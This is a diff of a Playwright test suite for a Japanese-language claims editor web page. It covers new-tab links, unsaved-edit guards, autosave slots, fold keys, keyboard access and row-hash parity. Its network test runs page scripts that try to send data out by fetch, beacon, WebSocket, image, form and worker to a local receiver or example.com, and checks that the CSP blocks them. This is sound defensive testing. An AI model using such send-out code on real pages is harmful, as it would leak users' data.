@@ -284,7 +284,7 @@ class ClaimsEditor(unittest.TestCase):
                 self.assertRegex(t, r'[A-Za-z぀-ヿ一-鿿]', (h, t))
         self.assertEqual(pg.problems, [])
 
-    def test_slide_links_open_the_slide_page(self):
+    def test_links_leave_in_a_new_tab_and_unsaved_edits_are_guarded(self):
         import csv
         pg = self.open()
         self.sample(pg, 'a')
@@ -293,10 +293,35 @@ class ClaimsEditor(unittest.TestCase):
             n = {r['id']: r['n'] for r in csv.DictReader(f)}
         link = pg.locator('a[data-slide="p05-multitenancy"]').first
         self.assertEqual(link.get_attribute('href'), '../#p05-multitenancy')
-        link.click()
-        pg.wait_for_url(self.origin + '/#p05-multitenancy')
-        pg.wait_for_selector('#pos')
-        self.assertEqual(pg.inner_text('#pos'), f"{n['p05-multitenancy']} / {len(n)}")
+        self.assertEqual((link.get_attribute('target'), link.get_attribute('rel')), ('_blank', 'noopener noreferrer'))
+        # every link of the page that leaves the editor (another site or the slide page) opens in a new tab
+        leaving = pg.eval_on_selector_all('a[href]', """els => els.filter(a => /^(https?:|\\.\\.\\/)/.test(a.getAttribute('href')))
+            .map(a => [a.getAttribute('href'), a.getAttribute('target'), a.getAttribute('rel')])""")
+        self.assertTrue(leaving)
+        self.assertEqual([x for x in leaving if x[1:] != ['_blank', 'noopener noreferrer']], [])
+        with pg.context.expect_page() as popup:
+            link.click()
+        slide = popup.value
+        slide.wait_for_selector('#pos')
+        self.assertEqual(slide.inner_text('#pos'), f"{n['p05-multitenancy']} / {len(n)}")
+        self.assertEqual(pg.evaluate('() => location.pathname'), '/claims/')  # the editor stays
+        # an edit that is not written out: leaving the page asks first (beforeunload)
+        pg.evaluate('() => ClaimsEditor.replaceText("hops.yaml", "hops:", "hops:  # unsaved")')
+        self.assertTrue(pg.evaluate('() => ClaimsEditor.unsaved()'))
+        self.assertTrue(pg.evaluate('() => { const e = new Event("beforeunload", { cancelable: true }); dispatchEvent(e); return e.defaultPrevented; }'))
+        pg.locator('main h1').click()  # a user activation, which Chromium needs to show the question
+        with pg.expect_event('dialog') as dlg:
+            pg.close(run_before_unload=True)
+        self.assertEqual(dlg.value.type, 'beforeunload')
+        dlg.value.dismiss()  # stay on the page
+        # once written out, leaving asks nothing
+        pg2 = self.open(accept_downloads=True)
+        self.sample(pg2, 'a')
+        pg2.evaluate('() => ClaimsEditor.replaceText("hops.yaml", "hops:", "hops:  # unsaved")')
+        with pg2.expect_download():
+            pg2.click('#btn-export-zip')
+        self.assertFalse(pg2.evaluate('() => ClaimsEditor.unsaved()'))
+        self.assertFalse(pg2.evaluate('() => { const e = new Event("beforeunload", { cancelable: true }); dispatchEvent(e); return e.defaultPrevented; }'))
 
     # ------------------------------------------------------------------ edit -> diagnostics (editor and preview)
     def test_edit_shows_schema_and_lint_diagnostics_in_the_editor_and_the_preview(self):
@@ -435,15 +460,70 @@ class ClaimsEditor(unittest.TestCase):
         self.assertEqual(pg.evaluate('() => Object.keys(localStorage)'), [])  # nothing is stored unless enabled
         pg.check('#chk-autosave')
         pg.evaluate('() => ClaimsEditor.replaceText("hops.yaml", "# mine", "# mine2")')
-        self.poll(pg, '() => (localStorage.getItem("claims-editor:autosave:v1") || "").includes("mine2")', timeout=5)
+        key = 'claims-editor:autosave:v2:templates/examples/scenario-a'
+        self.poll(pg, 'k => (localStorage.getItem(k) || "").includes("mine2")', arg=key, timeout=5)
         pg.reload()
-        pg.wait_for_selector('#btn-restore')
+        pg.wait_for_selector('[data-restore="templates/examples/scenario-a"]')
         self.assertFalse(pg.evaluate('() => ClaimsEditor.state().open'))  # still opens empty; restoring is a choice
-        pg.click('#btn-restore')
+        pg.click('[data-restore="templates/examples/scenario-a"]')
         self.poll(pg, '() => ClaimsEditor.state().open')
         self.assertIn('# mine2', pg.evaluate('() => ClaimsEditor.fileText("hops.yaml")'))
         pg.uncheck('#chk-autosave')
         self.assertEqual(pg.evaluate('() => Object.keys(localStorage)'), [])
+        self.assertEqual(pg.problems, [])
+
+    def test_opening_another_design_never_loses_work(self):
+        # the loss of the PR #51 check (F1): paste MY-WORK, enable autosave, close, open sample A -> MY-WORK was overwritten
+        pg = self.open(accept_downloads=True)
+        pg.click('#btn-paste')
+        pg.fill('#paste-text', 'hops:\n  - id: MY-WORK\n')
+        pg.click('#paste-open')
+        self.poll(pg, '() => ClaimsEditor.state().open')
+        pg.check('#chk-autosave')
+        self.assertEqual(pg.evaluate('() => Object.keys(localStorage).filter(k => k.includes("autosave:v2"))'), [])  # opening saves nothing
+        pg.evaluate('() => ClaimsEditor.replaceText("hops.yaml", "MY-WORK", "MY-WORK-2")')
+        mine = 'claims-editor:autosave:v2:work/pasted'
+        self.poll(pg, 'k => (localStorage.getItem(k) || "").includes("MY-WORK-2")', arg=mine, timeout=5)
+        pg.click('#btn-close')  # autosave holds the edit: no question
+        self.poll(pg, '() => !ClaimsEditor.state().open')
+        self.sample(pg, 'a')
+        pg.wait_for_timeout(1500)
+        self.assertIn('MY-WORK-2', pg.evaluate('k => localStorage.getItem(k)', mine))  # still there
+        self.assertIsNone(pg.evaluate('() => localStorage.getItem("claims-editor:autosave:v2:templates/examples/scenario-a")'))
+        # without autosave (turning it off deletes every slot): an edit not written out is not replaced without asking
+        pg.uncheck('#chk-autosave')
+        pg.evaluate('() => ClaimsEditor.replaceText("hops.yaml", "hops:", "hops:  # unsaved")')
+        pg.click('#btn-close')
+        pg.wait_for_selector('dialog#confirm[open]')
+        self.assertIn('書き出していない変更', pg.inner_text('dialog#confirm'))
+        self.assertTrue(pg.evaluate('() => document.activeElement.closest("dialog") !== null'))  # focus is in the dialog
+        pg.click('dialog#confirm [data-choice="cancel"]')
+        self.poll(pg, '() => !document.querySelector("dialog#confirm")')
+        self.assertTrue(pg.evaluate('() => ClaimsEditor.state().open'))
+        self.assertIn('# unsaved', pg.evaluate('() => ClaimsEditor.fileText("hops.yaml")'))
+        with pg.expect_download() as dl:
+            pg.click('#btn-close')
+            pg.click('dialog#confirm [data-choice="export"]')
+        self.assertEqual(dl.value.suggested_filename, 'scenario-a.zip')
+        with zipfile.ZipFile(dl.value.path()) as z:
+            self.assertIn(b'# unsaved', z.read('scenario-a/hops.yaml'))
+        self.poll(pg, '() => !ClaimsEditor.state().open')
+        # an autosaved version of the design being opened is offered first
+        self.sample(pg, 'a')
+        pg.check('#chk-autosave')
+        pg.evaluate('() => ClaimsEditor.replaceText("hops.yaml", "hops:", "hops:  # saved-a")')
+        self.poll(pg, '() => (localStorage.getItem("claims-editor:autosave:v2:templates/examples/scenario-a") || "").includes("saved-a")', timeout=5)
+        pg.click('#btn-close')
+        self.poll(pg, '() => !ClaimsEditor.state().open')
+        pg.click('#btn-sample-a')
+        pg.wait_for_selector('dialog#confirm[open]')
+        self.assertIn('自動保存した版', pg.inner_text('dialog#confirm'))
+        pg.click('dialog#confirm [data-choice="saved"]')
+        self.poll(pg, '() => ClaimsEditor.state().open')
+        self.assertIn('# saved-a', pg.evaluate('() => ClaimsEditor.fileText("hops.yaml")'))
+        self.assertEqual(sorted(pg.evaluate('() => Object.keys(localStorage).filter(k => k.includes("autosave:v2"))')),
+                         ['claims-editor:autosave:v2:templates/examples/scenario-a'])  # turning autosave off earlier cleared MY-WORK's slot
+        self.shot(pg, '31_autosave_slots')
         self.assertEqual(pg.problems, [])
 
     # ------------------------------------------------------------------ folds, keyboard, #50 hooks
@@ -451,43 +531,97 @@ class ClaimsEditor(unittest.TestCase):
         pg = self.open()
         self.sample(pg, 'a')
         self.go(pg, '#/ledger', '台帳')
-        row = pg.locator('details[data-fold="claim-C-iss"]')
+        row = pg.locator('details[data-fold="claim~C-iss"]')
         self.assertFalse(row.evaluate('e => e.open'))
         row.locator('summary').first.click()
-        self.poll(pg, '() => location.hash.includes("claim-C-iss")', timeout=5)  # the toggle event is asynchronous
+        self.poll(pg, '() => decodeURIComponent(location.hash).includes("claim~C-iss")', timeout=5)  # the toggle event is asynchronous
         self.assertGreater(row.locator('[data-col]').count(), 50)  # built when opened
-        pg.locator('details[data-fold="sec-却下"] > summary').click()
-        self.poll(pg, '() => decodeURIComponent(location.hash).includes("sec-却下")', timeout=5)
+        pg.locator('details[data-fold="sec~却下"] > summary').click()
+        self.poll(pg, '() => decodeURIComponent(decodeURIComponent(location.hash)).includes("sec~却下")', timeout=5)
         h = pg.evaluate('() => location.hash')
-        self.assertIn('sec-却下', pg.evaluate('h => decodeURIComponent(h)', h))
         # the same URL opens the same folds
         self.go(pg, '#/overview', 'シナリオ A')
         self.go(pg, h, '台帳')
-        self.assertTrue(pg.locator('details[data-fold="claim-C-iss"]').evaluate('e => e.open'))
-        self.assertFalse(pg.locator('details[data-fold="sec-却下"]').evaluate('e => e.open'))
-        # column groups of a detail screen
+        self.assertTrue(pg.locator('details[data-fold="claim~C-iss"]').evaluate('e => e.open'))
+        self.assertFalse(pg.locator('details[data-fold="sec~却下"]').evaluate('e => e.open'))
+        # column groups are keyed by their names (templates/registry/README.md 3.1), not by their position
+        groups = []
+        for c in pg.evaluate('() => window.CLAIMS_VIEWER_DATA.meta.columns.claims'):
+            if c.get('group') and c['group'] not in groups:
+                groups.append(c['group'])
         self.go(pg, '#/claim/C-iss', '(C-iss)')
-        pg.locator('details[data-fold="grp-1"] > summary').click()
-        self.poll(pg, '() => location.hash.includes("grp-1")', timeout=5)
+        keys = pg.eval_on_selector_all('main details.fold', 'els => els.map(e => e.dataset.fold)')
+        self.assertEqual(keys, ['grp~' + g.replace(' ', '_') for g in groups])
+        second = keys[1]
+        pg.locator(f'details[data-fold="{second}"] > summary').click()
+        self.poll(pg, 'k => decodeURIComponent(decodeURIComponent(location.hash)).includes(k)', arg=second, timeout=5)
         pg.click('text=すべて畳む')
         self.assertEqual(pg.locator('main details.fold[open]').count(), 0)
         self.shot(pg, '30_folds')
+        self.assertEqual(pg.problems, [])
+
+    def test_fold_keys_and_ids_do_not_collide(self):
+        # C-a's column group and a row whose id is C-a-1 had the same key with positional keys (claim-C-a-1)
+        pg = self.open()
+        pg.click('#btn-paste')
+        pg.fill('#paste-text', 'claims:\n  - id: C-a\n    name: a\n    decision: 採用\n  - id: C-a-1\n    name: b\n    decision: 採用\n')
+        pg.select_option('#paste-kind', 'claims.yaml')
+        pg.click('#paste-open')
+        self.poll(pg, '() => ClaimsEditor.state().open')
+        self.go(pg, '#/ledger', '台帳')
+        pg.click('text=すべて開く')
+        keys = pg.eval_on_selector_all('details.fold', 'els => els.map(e => e.dataset.fold)')
+        self.assertEqual(len(keys), len(set(keys)), keys)
+        self.assertIn('claim~C-a-1', keys)
+        self.assertTrue(any(k.startswith('claim~C-a~grp~') for k in keys))
+        ids = pg.eval_on_selector_all('[id]', 'els => els.map(e => e.id)')
+        self.assertEqual(len(ids), len(set(ids)), [x for x in ids if ids.count(x) > 1])
         self.assertEqual(pg.problems, [])
 
     def test_keyboard(self):
         pg = self.open()
         pg.keyboard.press('Tab')
         self.assertEqual(pg.evaluate('document.activeElement.textContent'), '本文へ移動')
+        visited = []
         for _ in range(30):
-            if pg.evaluate('document.activeElement.id') == 'btn-sample-a':
+            visited.append(pg.evaluate('() => document.activeElement.id || document.activeElement.tagName'))
+            if visited[-1] == 'btn-sample-a':
                 break
             pg.keyboard.press('Tab')
+        self.assertNotIn('in-files', visited)  # the hidden file inputs are not in the tab order (F3)
+        self.assertNotIn('in-folder', visited)
         pg.keyboard.press('Enter')
         self.poll(pg, '() => ClaimsEditor.state().open', timeout=10)
+        # tabs: the tablist holds only tabs; each tab controls the editor panel; arrows, Home and End move (F5)
+        roles = pg.eval_on_selector_all('#tabs > *', 'els => els.map(e => e.getAttribute("role"))')
+        self.assertEqual(set(roles), {'tab'})
+        self.assertEqual(set(pg.eval_on_selector_all('#tabs [role=tab]', 'els => els.map(e => e.getAttribute("aria-controls"))')), {'editor'})
+        self.assertEqual(pg.get_attribute('#editor', 'role'), 'tabpanel')
+        self.assertEqual(pg.eval_on_selector_all('#tabs [role=tab][tabindex="0"]', 'els => els.map(e => e.id)'), ['tab-claims.yaml'])
         pg.focus('#tab-claims\\.yaml')
         pg.keyboard.press('ArrowRight')
         self.assertEqual(pg.evaluate('() => ClaimsEditor.state().active'), 'token_types.yaml')
         self.assertEqual(pg.evaluate('document.activeElement.id'), 'tab-token_types.yaml')
+        self.assertEqual(pg.get_attribute('#editor', 'aria-labelledby'), 'tab-token_types.yaml')
+        pg.keyboard.press('End')
+        self.assertEqual(pg.evaluate('() => ClaimsEditor.state().active'), 'design.md')
+        pg.keyboard.press('Home')
+        self.assertEqual(pg.evaluate('() => ClaimsEditor.state().active'), 'claims.yaml')
+        # the counts of a tab have words for a screen reader
+        pg.evaluate('() => ClaimsEditor.replaceText("claims.yaml", "  - id: C-iss\\n", "  - id: C-iss\\n    bogus_column: 1\\n")')
+        self.poll(pg, '() => document.querySelector("#tab-claims\\\\.yaml").textContent.includes("エラー 1 件")', timeout=5)
+        self.assertEqual(pg.get_attribute('#tab-claims\\.yaml .tb', 'aria-hidden'), 'true')
+        # Tab in the editor moves on (it does not indent), and Shift+Tab does not land on a hidden input
+        pg.focus('#tab-claims\\.yaml')
+        pg.keyboard.press('Tab')
+        self.assertTrue(pg.evaluate('() => document.activeElement.id === "editor" || !!(document.activeElement.shadowRoot)'))
+        before = pg.evaluate('() => ClaimsEditor.fileText("claims.yaml")')
+        pg.keyboard.press('Tab')
+        self.assertEqual(pg.evaluate('() => ClaimsEditor.fileText("claims.yaml")'), before)
+        self.assertNotEqual(pg.evaluate('() => document.activeElement.id'), 'editor')
+        pg.keyboard.press('Shift+Tab')
+        pg.keyboard.press('Shift+Tab')
+        self.assertNotIn(pg.evaluate('() => document.activeElement.id'), ('in-add', 'in-files', 'in-folder'))
         self.go(pg, '#/claims', 'クレームの一覧')
         pg.locator('main h1').click()
         pg.keyboard.press('/')
@@ -524,6 +658,52 @@ class ClaimsEditor(unittest.TestCase):
         self.assertIn('panel claims:C-iss detail', pg.inner_text('[data-panel-for="claims:C-iss"]'))
         pg.click('[data-reveal="claims:C-iss"]')
         self.assertEqual(pg.evaluate('() => ClaimsEditor.state().active'), 'claims.yaml')
+        # an id written twice has no anchor and is reported (rule ANCHOR)
+        pg.evaluate('() => ClaimsEditor.replaceText("claims.yaml", "  - id: C-sub\\n", "  - id: C-iss\\n")')
+        self.poll(pg, '() => ClaimsEditor.duplicateAnchors().includes("claims:C-iss")', timeout=5)
+        self.assertIsNone(pg.evaluate('() => ClaimsEditor.rowHash("claims:C-iss")'))
+        self.assertNotIn('claims:C-iss', pg.evaluate('() => ClaimsEditor.anchors().map(a => a.anchor)'))
+        d = [x for x in pg.evaluate('() => ClaimsEditor.diagnostics()') if x['rule'] == 'ANCHOR']
+        self.assertEqual(len(d), 2, d)
+        self.assertEqual(pg.problems, [])
+
+    def test_row_hashes_equal_tools_row_hash(self):
+        import row_hash
+        from claim_lint.core import _Loader
+        pg = self.open()
+        report = []
+        for letter in ('a', 'b'):
+            if letter == 'b':
+                pg.click('#btn-close')
+                self.poll(pg, '() => !ClaimsEditor.state().open')
+            self.sample(pg, letter)
+            got = dict(pg.evaluate('() => ClaimsEditor.anchors().map(a => [a.anchor, ClaimsEditor.rowHash(a.anchor)])'))
+            want = row_hash.row_hashes(os.path.join(EXAMPLES, 'scenario-' + letter))
+            self.assertEqual(got, want['hashes'], letter)
+            report.append({'scenario': letter.upper(), 'anchors': len(got), 'equal': got == want['hashes']})
+        # JCS of the same YAML text, in the browser (yaml, YAML 1.1) and in Python (claim_lint's PyYAML loader)
+        texts = ['a: 1.0\nb: 1\nc: -0.0\nd: 1.5e+3\ne: 1.0e-7\nf: 0.000001\ng: 123456789012345678901234\nh: 1.0e+21\n',
+                 'x: "\\u00e9\\u65e5\\u672c\\u0001\\t\\"\\\\ \\U0001F600"\n',
+                 '{z: 1, "\\u00e9": 2, a: 3, "10": 4, "9": 5, "\\u20ac": 6, "\\U0001F600": 7, "\\uff61": 8, B: 9}\n',
+                 'nest:\n  - {b: [1, {d: null, c: true}], a: false}\n  - []\n  - {}\n',
+                 'k: yes\nl: on\nm: 012\nhex: 0x1f\no: 1:20\np: 1_000\nq: 2026-01-01\nr: ~\n',
+                 'base: &b {u: 1}\nalias: *b\n']  # an alias; a merge key (<<) is an error in claim_lint's loader
+        for t in texts:
+            js = pg.evaluate('t => ClaimsEditor.canonicalYaml(t)', t)
+            py = row_hash.jcs(yaml.load(t, Loader=_Loader))
+            self.assertEqual(js, py, t)
+        # values that YAML 1.1 readers disagree on (documented in README): not used in the samples
+        for t, js_v, py_v in (('i: y\n', '{"i":true}', '{"i":"y"}'), ('j: 1e3\n', '{"j":1000}', '{"j":"1e3"}'),
+                                ('n: 1\n', '{"false":1}', '{"n":1}')):
+            self.assertEqual(pg.evaluate('t => ClaimsEditor.canonicalYaml(t)', t), js_v)
+            self.assertEqual(row_hash.jcs(yaml.load(t, Loader=_Loader)), py_v)
+        if EVIDENCE:
+            with open(os.path.join(ROOT, EVIDENCE, 'row-hash-parity.json'), 'w', encoding='utf-8', newline='\n') as f:
+                json.dump({'what': 'ClaimsEditor.rowHash (browser) vs python tools/row_hash.py, RFC 8785 JCS + SHA-256',
+                           'results': report, 'jcs_vectors_equal': len(texts),
+                           'known_differences': ['bare y / n, also as a key (yaml: boolean, PyYAML: string)', '1e3 without a dot (yaml: number, PyYAML: string)']},
+                          f, ensure_ascii=False, indent=1)
+                f.write('\n')
         self.assertEqual(pg.problems, [])
 
     # ------------------------------------------------------------------ no data leaves the browser
@@ -549,30 +729,56 @@ class ClaimsEditor(unittest.TestCase):
             self.go(pg, h)
         steps.append('visit the preview screens')
         session = list(pg.requests)
-        # a script that tries to send: blocked by the CSP before any request (other origin), and a same-origin POST is
-        # not made by the editor (checked on the log below)
+        # a script that tries to send to another origin: a receiver on another port records every request it gets
+        hits = []
+
+        class Receiver(http.server.BaseHTTPRequestHandler):
+            def log_message(self, *a):
+                pass
+
+            def _hit(self):
+                hits.append({'method': self.command, 'path': self.path})
+                self.send_response(200)
+                self.send_header('Access-Control-Allow-Origin', '*')
+                self.end_headers()
+            do_GET = do_POST = do_PUT = do_OPTIONS = _hit
+        rcv = socketserver.ThreadingTCPServer(('127.0.0.1', 0), Receiver)
+        rcv.daemon_threads = True
+        threading.Thread(target=rcv.serve_forever, daemon=True).start()
+        self.addCleanup(rcv.shutdown)
+        other = f'127.0.0.1:{rcv.server_address[1]}'
+        ws_events = []
+        pg.on('websocket', lambda w: ws_events.append(w.url))
         before = len(pg.requests)
-        attempts = pg.evaluate('''async () => {
-            const out = [];
-            try { await fetch('https://example.com/leak', {method: 'POST', body: 'x'}); out.push('fetch sent'); } catch (e) { out.push('fetch blocked'); }
-            try { out.push('beacon ' + navigator.sendBeacon('https://example.com/beacon', 'x')); } catch (e) { out.push('beacon blocked'); }
-            try { new WebSocket('wss://example.com/ws'); out.push('websocket opened'); } catch (e) { out.push('websocket blocked'); }
+        attempts = pg.evaluate('''async (other) => {
+            const out = {};
+            try { await fetch(`http://${other}/fetch`, {method: 'POST', body: 'x'}); out.fetch = 'sent'; } catch (e) { out.fetch = 'refused'; }
+            try { out.beacon_queued = navigator.sendBeacon(`http://${other}/beacon`, 'x'); } catch (e) { out.beacon_queued = 'refused'; }
+            try { const w = new WebSocket(`ws://${other}/ws`); out.websocket = await new Promise((r) => { w.onopen = () => r('open'); w.onerror = () => r('error (no connection)'); setTimeout(() => r('no event'), 3000); }); } catch (e) { out.websocket = 'refused'; }
+            const img = new Image(); img.src = `http://${other}/img`; document.body.append(img);
+            const f = document.createElement('form'); f.method = 'post'; f.action = `http://${other}/form`; f.target = '_blank'; document.body.append(f);
+            try { f.submit(); out.form = 'submitted'; } catch (e) { out.form = 'refused'; }
             // the worker is started like the claim_lint worker (blob:): it inherits this CSP
-            const src = "fetch('https://example.com/from-worker').then(() => postMessage('sent'), () => postMessage('blocked'));";
+            const src = `fetch('http://${other}/worker', {method: 'POST', body: 'x'}).then(() => postMessage('sent'), () => postMessage('refused'));`;
             const w = new Worker(URL.createObjectURL(new Blob([src], { type: 'text/javascript' })));
-            out.push('worker fetch ' + await new Promise((r) => { w.onmessage = (e) => r(e.data); }));
-            return out; }''')
-        pg.wait_for_timeout(500)
-        # sendBeacon only queues the beacon (it may return true); the CSP then refuses it, and no request is made
-        self.assertEqual([a for a in attempts if not a.startswith('beacon')], ['fetch blocked', 'websocket opened', 'worker fetch blocked'])
+            out.worker_fetch = await new Promise((r) => { w.onmessage = (e) => r(e.data); });
+            return out; }''', other)
+        pg.wait_for_timeout(1500)
+        self.assertEqual(hits, [], 'the receiver on another origin got a request')
+        self.assertEqual((attempts['fetch'], attempts['worker_fetch']), ('refused', 'refused'))
+        self.assertNotEqual(attempts['websocket'], 'open')
+        self.assertEqual(ws_events, [])
+        # Playwright reports the <img> request as started; the CSP stops it before anything is sent (the receiver got none)
         attempt_requests = pg.requests[before:]
-        self.assertEqual([r for r in attempt_requests if not r['url'].startswith('blob:')], [], attempt_requests)
+        blocked = {(v['directive'], v['blocked'].split('/')[2] if '//' in v['blocked'] else v['blocked']) for v in violations}
+        for d in ('connect-src', 'img-src', 'form-action'):
+            self.assertIn((d, other), blocked, violations)
         everything = initial + session
         bad = [r for r in everything if r['method'] != 'GET' or not (r['url'].startswith(self.origin + '/') or r['url'].startswith('blob:' + self.origin))
                or r['type'] in ('ping', 'beacon', 'websocket', 'eventsource')]
         self.assertEqual(bad, [])
         self.assertTrue(any('pyodide.asm.wasm' in r['url'] for r in session))
-        self.assertTrue({v['directive'] for v in violations} <= {'connect-src'}, violations)
+        self.assertTrue({v['directive'] for v in violations} <= {'connect-src', 'img-src', 'form-action'}, violations)
         if EVIDENCE:
             o = lambda u: u.replace(self.origin, '<origin>')  # noqa: E731
             with open(os.path.join(ROOT, EVIDENCE, 'network-log.json'), 'w', encoding='utf-8', newline='\n') as f:
@@ -589,8 +795,12 @@ class ClaimsEditor(unittest.TestCase):
                                 'non_get_or_cross_origin_or_beacon': len(bad)},
                     'initial_load_requests': [dict(r, url=o(r['url'])) for r in initial],
                     'session_requests': [dict(r, url=o(r['url'])) for r in session],
-                    'send_attempts_from_the_page': attempts,
-                    'requests_made_by_those_attempts': [dict(r, url=o(r['url'])) for r in attempt_requests],
+                    'send_attempts': {'receiver': 'an HTTP server on another port of 127.0.0.1 that records every request (another origin)',
+                                      'tried': ['fetch POST', 'navigator.sendBeacon', 'WebSocket', '<img>', 'form.submit() POST',
+                                                'fetch POST from a blob: worker (as the claim_lint worker)'],
+                                      'results_in_the_page': attempts, 'requests_received_by_the_receiver': hits,
+                                      'websocket_events_seen_by_playwright': ws_events},
+                    'requests_playwright_saw_start_during_the_attempts': [dict(r, url=o(r['url'])) for r in attempt_requests],
                     'csp_violations': [dict(v, blocked=o(v['blocked'])) for v in violations],
                 }, f, ensure_ascii=False, indent=1)
                 f.write('\n')
